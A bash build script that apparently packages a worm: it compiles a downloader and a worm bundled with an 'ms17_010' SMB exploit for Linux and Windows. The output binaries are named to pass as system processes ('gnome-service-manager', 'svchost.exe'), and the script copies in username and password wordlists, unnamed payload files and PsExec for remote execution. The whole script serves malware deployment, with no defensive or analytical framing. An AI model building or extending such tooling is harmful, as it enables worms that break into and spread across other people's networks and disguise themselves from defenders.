#!/bin/bash
if [ ! -d ./dist ]; then
    mkdir -p ./dist
fi

GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/lindown downloader.go
GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go

GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/gnome-service-manager worm.go ms17_010.go
GOOS=windows GOARCH=386 go build -o ./dist/svchost.exe worm.go ms17_010.go

cp user.txt ./dist/
cp passwds.txt ./dist/

cp 32 ./dist/
cp 32_1 ./dist/
cp 64 ./dist/
cp 64_1 ./dist/
cp PsExec.exe ./dist/
